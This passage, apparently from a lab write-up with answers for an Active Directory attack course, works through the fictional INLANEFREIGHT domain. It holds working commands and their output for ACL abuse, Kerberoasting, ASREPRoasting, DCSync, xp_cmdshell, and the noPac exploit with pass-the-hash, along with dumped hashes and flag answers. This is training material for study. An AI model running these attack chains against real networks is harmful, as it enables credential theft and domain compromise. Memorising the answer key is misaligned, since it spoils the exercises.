<span class="normal"><a href="#__codelineno-269-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-269-1"><a id="__codelineno-269-1" name="__codelineno-269-1"></a>$sid = Convert-NameToSid forend
</span><span id="__span-269-2"><a id="__codelineno-269-2" name="__codelineno-269-2"></a>
</span><span id="__span-269-3"><a id="__codelineno-269-3" name="__codelineno-269-3"></a>Get-DomainObjectACL -Identity &quot;dpayne&quot; -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
</span></code></pre></div></td></tr></table></div>
This can also be done with other tools such as Bloodhound, installed under C:\Tools.
Results: GenericAll</p>
<p><strong>What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-270-1">1</a></span>
<span class="normal"><a href="#__codelineno-270-2">2</a></span>
<span class="normal"><a href="#__codelineno-270-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-270-1"><a id="__codelineno-270-1" name="__codelineno-270-1"></a>$sid = Convert-NameToSid forend
</span><span id="__span-270-2"><a id="__codelineno-270-2" name="__codelineno-270-2"></a>
</span><span id="__span-270-3"><a id="__codelineno-270-3" name="__codelineno-270-3"></a>Get-DomainObjectACL -Identity &quot;GPO Management&quot; -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
</span></code></pre></div></td></tr></table></div>
<p>Results: Self-Membership</p>
<p><strong>Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.</strong></p>
<p><img alt="" src="../img/dacl01.png" /></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-271-1">1</a></span>
<span class="normal"><a href="#__codelineno-271-2">2</a></span>
<span class="normal"><a href="#__codelineno-271-3">3</a></span>
<span class="normal"><a href="#__codelineno-271-4">4</a></span>
<span class="normal"><a href="#__codelineno-271-5">5</a></span>
<span class="normal"><a href="#__codelineno-271-6">6</a></span>
<span class="normal"><a href="#__codelineno-271-7">7</a></span>
<span class="normal"><a href="#__codelineno-271-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-271-1"><a id="__codelineno-271-1" name="__codelineno-271-1"></a><span class="c">##########</span>
</span><span id="__span-271-2"><a id="__codelineno-271-2" name="__codelineno-271-2"></a><span class="c"># 1. Abuse ForceChangePassword: take over account damundsen</span>
</span><span id="__span-271-3"><a id="__codelineno-271-3" name="__codelineno-271-3"></a><span class="c">#########</span>
</span><span id="__span-271-4"><a id="__codelineno-271-4" name="__codelineno-271-4"></a>
</span><span id="__span-271-5"><a id="__codelineno-271-5" name="__codelineno-271-5"></a><span class="c"># Wley will change the password of damundsen. First, open Powershell as Wley</span>
</span><span id="__span-271-6"><a id="__codelineno-271-6" name="__codelineno-271-6"></a><span class="c"># Creating a PSCredential Object</span>
</span><span id="__span-271-7"><a id="__codelineno-271-7" name="__codelineno-271-7"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;transporter@4&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span><span id="__span-271-8"><a id="__codelineno-271-8" name="__codelineno-271-8"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;INLANEFREIGHT\wley&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/dacl.png" /></p>
<p>Our user damundsen has GenericWrite privileges over the <code>Help Desk Level 1</code> group. This means, among other things, that the attacker can add a user/group/computer to a group.</p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-272-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-272-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-272-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-272-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-272-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-272-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-272-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-272-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-272-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-272-10">10</a></span>
<span class="normal"><a href="#__codelineno-272-11">11</a></span>
<span class="normal"><a href="#__codelineno-272-12">12</a></span>
<span class="normal"><a href="#__codelineno-272-13">13</a></span>
<span class="normal"><a href="#__codelineno-272-14">14</a></span>
<span class="normal"><a href="#__codelineno-272-15">15</a></span>
<span class="normal"><a href="#__codelineno-272-16">16</a></span>
<span class="normal"><a href="#__codelineno-272-17">17</a></span>
<span class="normal"><a href="#__codelineno-272-18">18</a></span>
<span class="normal"><a href="#__codelineno-272-19">19</a></span>
<span class="normal"><a href="#__codelineno-272-20">20</a></span>
<span class="normal"><a href="#__codelineno-272-21">21</a></span>
<span class="normal"><a href="#__codelineno-272-22">22</a></span>
<span class="normal"><a href="#__codelineno-272-23">23</a></span>
<span class="normal"><a href="#__codelineno-272-24">24</a></span>
<span class="normal"><a href="#__codelineno-272-25">25</a></span>
<span class="normal"><a href="#__codelineno-272-26">26</a></span>
<span class="normal"><a href="#__codelineno-272-27">27</a></span>
<span class="normal"><a href="#__codelineno-272-28">28</a></span>
<span class="normal"><a href="#__codelineno-272-29">29</a></span>
<span class="normal"><a href="#__codelineno-272-30">30</a></span>
<span class="normal"><a href="#__codelineno-272-31">31</a></span>
<span class="normal"><a href="#__codelineno-272-32">32</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-272-1"><a id="__codelineno-272-1" name="__codelineno-272-1"></a><span class="c">##########</span>
</span><span id="__span-272-2"><a id="__codelineno-272-2" name="__codelineno-272-2"></a><span class="c"># 2. Abuse GenericWrite: add damundsen to group &#39;Help Desk Level 1&#39;</span>
</span><span id="__span-272-3"><a id="__codelineno-272-3" name="__codelineno-272-3"></a><span class="c">#########</span>
</span><span id="__span-272-4"><a id="__codelineno-272-4" name="__codelineno-272-4"></a><span class="c"># Open powershell as damundsen</span>
</span><span id="__span-272-5"><a id="__codelineno-272-5" name="__codelineno-272-5"></a><span class="c"># Creating a SecureString Object using damundsen</span>
</span><span id="__span-272-6"><a id="__codelineno-272-6" name="__codelineno-272-6"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Pwn3d_by_ACLs!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span><span id="__span-272-7"><a id="__codelineno-272-7" name="__codelineno-272-7"></a><span class="nv">$Cred2</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;INLANEFREIGHT\damundsen&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span> 
</span><span id="__span-272-8"><a id="__codelineno-272-8" name="__codelineno-272-8"></a>
</span><span id="__span-272-9"><a id="__codelineno-272-9" name="__codelineno-272-9"></a><span class="c"># Add damundsen to the group</span>
</span><span id="__span-272-10"><a id="__codelineno-272-10" name="__codelineno-272-10"></a><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s1">&#39;Help Desk Level 1&#39;</span> <span class="n">-Members</span> <span class="s1">&#39;damundsen&#39;</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Verbose</span>
</span><span id="__span-272-11"><a id="__codelineno-272-11" name="__codelineno-272-11"></a>
</span><span id="__span-272-12"><a id="__codelineno-272-12" name="__codelineno-272-12"></a><span class="c"># Confirming damundsen was Added to the Group</span>
</span><span id="__span-272-13"><a id="__codelineno-272-13" name="__codelineno-272-13"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Help Desk Level 1&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">MemberName</span>
</span><span id="__span-272-14"><a id="__codelineno-272-14" name="__codelineno-272-14"></a>
</span><span id="__span-272-15"><a id="__codelineno-272-15" name="__codelineno-272-15"></a>
</span><span id="__span-272-16"><a id="__codelineno-272-16" name="__codelineno-272-16"></a><span class="c">##########</span>
</span><span id="__span-272-17"><a id="__codelineno-272-17" name="__codelineno-272-17"></a><span class="c"># 3. Abuse GenericAll: Perform a kerberoasting attack</span>
</span><span id="__span-272-18"><a id="__codelineno-272-18" name="__codelineno-272-18"></a><span class="c">#########</span>
</span><span id="__span-272-19"><a id="__codelineno-272-19" name="__codelineno-272-19"></a><span class="c"># Members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could perform a targeted Kerberoasting attack and attempt to crack the user&#39;s password if it is weak</span>
</span><span id="__span-272-20"><a id="__codelineno-272-20" name="__codelineno-272-20"></a><span class="c"># Open powershell as damundsen</span>
</span><span id="__span-272-21"><a id="__codelineno-272-21" name="__codelineno-272-21"></a><span class="c"># Creating a SecureString Object using damundsen</span>
</span><span id="__span-272-22"><a id="__codelineno-272-22" name="__codelineno-272-22"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Pwn3d_by_ACLs!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span><span id="__span-272-23"><a id="__codelineno-272-23" name="__codelineno-272-23"></a><span class="nv">$Cred2</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;INLANEFREIGHT\damundsen&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span> 
</span><span id="__span-272-24"><a id="__codelineno-272-24" name="__codelineno-272-24"></a>
</span><span id="__span-272-25"><a id="__codelineno-272-25" name="__codelineno-272-25"></a><span class="c"># Creating a Fake SPN</span>
</span><span id="__span-272-26"><a id="__codelineno-272-26" name="__codelineno-272-26"></a><span class="nb">Set-DomainObject</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Identity</span> <span class="n">adunn</span> <span class="n">-SET</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;notahacker/LEGIT&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
</span><span id="__span-272-27"><a id="__codelineno-272-27" name="__codelineno-272-27"></a>
</span><span id="__span-272-28"><a id="__codelineno-272-28" name="__codelineno-272-28"></a><span class="c">#  Kerberoasting with Rubeus</span>
</span><span id="__span-272-29"><a id="__codelineno-272-29" name="__codelineno-272-29"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">adunn</span> <span class="p">/</span><span class="n">nowrap</span>
</span><span id="__span-272-30"><a id="__codelineno-272-30" name="__codelineno-272-30"></a>
</span><span id="__span-272-31"><a id="__codelineno-272-31" name="__codelineno-272-31"></a><span class="c"># Crack it</span>
</span><span id="__span-272-32"><a id="__codelineno-272-32" name="__codelineno-272-32"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="nv">$filename</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: SyncMaster757</p>
<p><strong>Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.</strong></p>
<p><div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-273-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-273-1"><a id="__codelineno-273-1" name="__codelineno-273-1"></a>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
</span></code></pre></div></td></tr></table></div>
Results: syncron</p>
<p><strong>What is this user's cleartext password?</strong>
Results: Mycleart3xtP@ss!</p>
<p><strong>Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-274-1">1</a></span>
<span class="normal"><a href="#__codelineno-274-2">2</a></span>
<span class="normal"><a href="#__codelineno-274-3">3</a></span>
<span class="normal"><a href="#__codelineno-274-4">4</a></span>
<span class="normal"><a href="#__codelineno-274-5">5</a></span>
<span class="normal"><a href="#__codelineno-274-6">6</a></span>
<span class="normal"><a href="#__codelineno-274-7">7</a></span>
<span class="normal"><a href="#__codelineno-274-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-274-1"><a id="__codelineno-274-1" name="__codelineno-274-1"></a># Open cmd 
</span><span id="__span-274-2"><a id="__codelineno-274-2" name="__codelineno-274-2"></a>runas /netonly /user:INLANEFREIGHT\adunn powershell
</span><span id="__span-274-3"><a id="__codelineno-274-3" name="__codelineno-274-3"></a># When prompted, enter password &#39;SyncMaster757&#39;
</span><span id="__span-274-4"><a id="__codelineno-274-4" name="__codelineno-274-4"></a>
</span><span id="__span-274-5"><a id="__codelineno-274-5" name="__codelineno-274-5"></a>cd C:\Tools\mimikatz\x64
</span><span id="__span-274-6"><a id="__codelineno-274-6" name="__codelineno-274-6"></a>.\mimikatz.exe
</span><span id="__span-274-7"><a id="__codelineno-274-7" name="__codelineno-274-7"></a>
</span><span id="__span-274-8"><a id="__codelineno-274-8" name="__codelineno-274-8"></a>lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
</span></code></pre></div></td></tr></table></div>
<p>Results: 4bb3b317845f0954200a6b0acc9b9f9a</p>
<h3 id="stacking-the-deck">Stacking The Deck</h3>
<p><strong>RDP to 10.129.230.228 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". What other user in the domain has CanPSRemote rights to a host?</strong></p>
<div class="language-cypher highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-275-1">1</a></span>
<span class="normal"><a href="#__codelineno-275-2">2</a></span>
<span class="normal"><a href="#__codelineno-275-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-275-1"><a id="__codelineno-275-1" name="__codelineno-275-1"></a><span class="err">#</span><span class="w"> </span><span class="n">Open</span><span class="w"> </span><span class="n">Bloodhound</span>
</span><span id="__span-275-2"><a id="__codelineno-275-2" name="__codelineno-275-2"></a><span class="err">#</span><span class="w"> </span><span class="k">In</span><span class="w"> </span><span class="n">Analysis</span><span class="w"> </span><span class="n">tab</span><span class="p">,</span><span class="w"> </span><span class="k">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">custom</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">call</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="s">&quot;Find WinRM users&quot;</span><span class="p">:</span>
</span><span id="__span-275-3"><a id="__codelineno-275-3" name="__codelineno-275-3"></a><span class="k">MATCH</span><span class="w"> </span><span class="n">p1</span><span class="p">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="p">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">g1</span><span class="p">:</span><span class="n">Group</span><span class="p">))</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="n">p2</span><span class="p">=(</span><span class="n">u1</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">CanPSRemote</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p2</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: bdavis</p>
<p><strong>What host can this user access via WinRM? (just the computer name)</strong>
Results: ACADEMY-EA-DC01</p>
<p><strong>Authenticate to ACADEMY-EA-DB01 with user "damundsen" and password "SQL1234!". Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-276-1">1</a></span>
<span class="normal"><a href="#__codelineno-276-2">2</a></span>
<span class="normal"><a href="#__codelineno-276-3">3</a></span>
<span class="normal"><a href="#__codelineno-276-4">4</a></span>
<span class="normal"><a href="#__codelineno-276-5">5</a></span>
<span class="normal"><a href="#__codelineno-276-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-276-1"><a id="__codelineno-276-1" name="__codelineno-276-1"></a><span class="n">ssh</span> <span class="n">htb-student</span><span class="nv">@172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">225</span>
</span><span id="__span-276-2"><a id="__codelineno-276-2" name="__codelineno-276-2"></a>
</span><span id="__span-276-3"><a id="__codelineno-276-3" name="__codelineno-276-3"></a><span class="n">mssqlclient</span><span class="p">.</span><span class="n">py</span> <span class="n">INLANEFREIGHT</span><span class="p">/</span><span class="n">DAMUNDSEN</span><span class="nv">@172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">150</span> <span class="n">-windows-auth</span>
</span><span id="__span-276-4"><a id="__codelineno-276-4" name="__codelineno-276-4"></a>
</span><span id="__span-276-5"><a id="__codelineno-276-5" name="__codelineno-276-5"></a><span class="n">enable_xp_cmdshell</span>
</span><span id="__span-276-6"><a id="__codelineno-276-6" name="__codelineno-276-6"></a><span class="n">xp_cmdshell</span> <span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">damundsen</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: 1m_the_sQl_@dm1n_n0w!</p>
<p><strong>Which two CVEs indicate NoPac.py may work? (Format: ####-#####&amp;####-#####, no spaces)</strong></p>
<p>Results: 2021-42278&amp;2021-42287</p>
<p><strong>Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-277-1">1</a></span>
<span class="normal"><a href="#__codelineno-277-2">2</a></span>
<span class="normal"><a href="#__codelineno-277-3">3</a></span>
<span class="normal"><a href="#__codelineno-277-4">4</a></span>
<span class="normal"><a href="#__codelineno-277-5">5</a></span>
<span class="normal"><a href="#__codelineno-277-6">6</a></span>
<span class="normal"><a href="#__codelineno-277-7">7</a></span>
<span class="normal"><a href="#__codelineno-277-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-277-1"><a id="__codelineno-277-1" name="__codelineno-277-1"></a># Add this line to the proxychains file /etc/proxychains
</span><span id="__span-277-2"><a id="__codelineno-277-2" name="__codelineno-277-2"></a>socks5 127.0.0.1 1234
</span><span id="__span-277-3"><a id="__codelineno-277-3" name="__codelineno-277-3"></a>
</span><span id="__span-277-4"><a id="__codelineno-277-4" name="__codelineno-277-4"></a># Establish a tunnel connection
</span><span id="__span-277-5"><a id="__codelineno-277-5" name="__codelineno-277-5"></a>ssh htb-student@$ip -D 1234
</span><span id="__span-277-6"><a id="__codelineno-277-6" name="__codelineno-277-6"></a>
</span><span id="__span-277-7"><a id="__codelineno-277-7" name="__codelineno-277-7"></a># Now from my attacker machine, test the NoPac vulnerability. First we will run an scanner from the host machine:
</span><span id="__span-277-8"><a id="__codelineno-277-8" name="__codelineno-277-8"></a>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
</span></code></pre></div></td></tr></table></div>
<p>It will return: </p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-278-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-278-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-278-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-278-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-278-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-278-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-278-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-278-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-278-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-278-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-278-1"><a id="__codelineno-278-1" name="__codelineno-278-1"></a><span class="c1"># it will save the file administrator_ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.ccache</span>
</span><span id="__span-278-2"><a id="__codelineno-278-2" name="__codelineno-278-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Current<span class="w"> </span>ms-DS-MachineAccountQuota<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">10</span>
</span><span id="__span-278-3"><a id="__codelineno-278-3" name="__codelineno-278-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT<span class="w"> </span>with<span class="w"> </span>PAC<span class="w"> </span>from<span class="w"> </span><span class="m">172</span>.16.5.5.<span class="w"> </span>Ticket<span class="w"> </span>size<span class="w"> </span><span class="m">1484</span>
</span><span id="__span-278-4"><a id="__codelineno-278-4" name="__codelineno-278-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT<span class="w"> </span>from<span class="w"> </span>ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.<span class="w"> </span>Ticket<span class="w"> </span>size<span class="w"> </span><span class="m">663</span>
</span><span id="__span-278-5"><a id="__codelineno-278-5" name="__codelineno-278-5"></a><span class="w"> </span><span class="sb">```</span>
</span><span id="__span-278-6"><a id="__codelineno-278-6" name="__codelineno-278-6"></a>
</span><span id="__span-278-7"><a id="__codelineno-278-7" name="__codelineno-278-7"></a>We<span class="w"> </span>could<span class="w"> </span><span class="k">then</span><span class="w"> </span>use<span class="w"> </span>the<span class="w"> </span>cache<span class="w"> </span>file<span class="w"> </span>to<span class="w"> </span>perform<span class="w"> </span>a<span class="w"> </span>pass-the-ticket<span class="w"> </span>and<span class="w"> </span>perform<span class="w"> </span>further<span class="w"> </span>attacks<span class="w"> </span>such<span class="w"> </span>as<span class="w"> </span>DCSync.<span class="w">  </span>Using<span class="w"> </span>noPac<span class="w"> </span>to<span class="w"> </span>DCSync<span class="w"> </span>the<span class="w"> </span>Built-in<span class="w"> </span>Administrator<span class="w"> </span>Account:
</span><span id="__span-278-8"><a id="__codelineno-278-8" name="__codelineno-278-8"></a>
</span><span id="__span-278-9"><a id="__codelineno-278-9" name="__codelineno-278-9"></a><span class="sb">```</span>bash
</span><span id="__span-278-10"><a id="__codelineno-278-10" name="__codelineno-278-10"></a>sudo<span class="w"> </span>python3<span class="w"> </span>noPac.py<span class="w"> </span>INLANEFREIGHT.LOCAL/forend:Klmcargo2<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w">  </span>-dc-host<span class="w"> </span>ACADEMY-EA-DC01<span class="w"> </span>--impersonate<span class="w"> </span>administrator<span class="w"> </span>-use-ldap<span class="w"> </span>-dump<span class="w"> </span>-just-dc-user<span class="w"> </span>INLANEFREIGHT/administrator
</span></code></pre></div></td></tr></table></div>
<p>It will return:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-279-1">1</a></span>
<span class="normal"><a href="#__codelineno-279-2">2</a></span>
<span class="normal"><a href="#__codelineno-279-3">3</a></span>
<span class="normal"><a href="#__codelineno-279-4">4</a></span>
<span class="normal"><a href="#__codelineno-279-5">5</a></span>
<span class="normal"><a href="#__codelineno-279-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-279-1"><a id="__codelineno-279-1" name="__codelineno-279-1"></a>[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span><span id="__span-279-2"><a id="__codelineno-279-2" name="__codelineno-279-2"></a>inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
</span><span id="__span-279-3"><a id="__codelineno-279-3" name="__codelineno-279-3"></a>[*] Kerberos keys grabbed
</span><span id="__span-279-4"><a id="__codelineno-279-4" name="__codelineno-279-4"></a>inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
</span><span id="__span-279-5"><a id="__codelineno-279-5" name="__codelineno-279-5"></a>inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
</span><span id="__span-279-6"><a id="__codelineno-279-6" name="__codelineno-279-6"></a>inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
</span></code></pre></div></td></tr></table></div>
<p>whereas the NTLM hash is 88ad09182de639ccc6579eb0849751cf. Now we can use crackmapexec (for instance):</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-280-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-280-1"><a id="__codelineno-280-1" name="__codelineno-280-1"></a>proxychains crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf  -x &#39;type C:\Users\Administrator\Desktop\DailyTasks\flag.txt&#39; --exec-method smbexec
</span></code></pre></div></td></tr></table></div>
<p>Results: D0ntSl@ckonN0P@c!</p>
<p><strong>RDP to  (ACADEMY-EA-MS01) ,10.129.32.8 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "Academy_student_AD!". Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-281-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-281-1"><a id="__codelineno-281-1" name="__codelineno-281-1"></a>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
</span></code></pre></div></td></tr></table></div>
<p>Results: ygroce</p>
<p><strong>Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-282-1">1</a></span>
<span class="normal"><a href="#__codelineno-282-2">2</a></span>
<span class="normal"><a href="#__codelineno-282-3">3</a></span>
<span class="normal"><a href="#__codelineno-282-4">4</a></span>
<span class="normal"><a href="#__codelineno-282-5">5</a></span>
<span class="normal"><a href="#__codelineno-282-6">6</a></span>
<span class="normal"><a href="#__codelineno-282-7">7</a></span>
<span class="normal"><a href="#__codelineno-282-8">8</a></span>
<span class="normal"><a href="#__codelineno-282-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-282-1"><a id="__codelineno-282-1" name="__codelineno-282-1"></a># Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
</span><span id="__span-282-2"><a id="__codelineno-282-2" name="__codelineno-282-2"></a>Import-Module .\PowerView.ps1
</span><span id="__span-282-3"><a id="__codelineno-282-3" name="__codelineno-282-3"></a>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
</span><span id="__span-282-4"><a id="__codelineno-282-4" name="__codelineno-282-4"></a>
</span><span id="__span-282-5"><a id="__codelineno-282-5" name="__codelineno-282-5"></a># Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
</span><span id="__span-282-6"><a id="__codelineno-282-6" name="__codelineno-282-6"></a>.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
</span><span id="__span-282-7"><a id="__codelineno-282-7" name="__codelineno-282-7"></a>
</span><span id="__span-282-8"><a id="__codelineno-282-8" name="__codelineno-282-8"></a># Cracking the Hash Offline with Hashcat:
</span><span id="__span-282-9"><a id="__codelineno-282-9" name="__codelineno-282-9"></a>hashcat -m 18200 ygroce /usr/share/wordlists/rockyou.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: Pass@word</p>
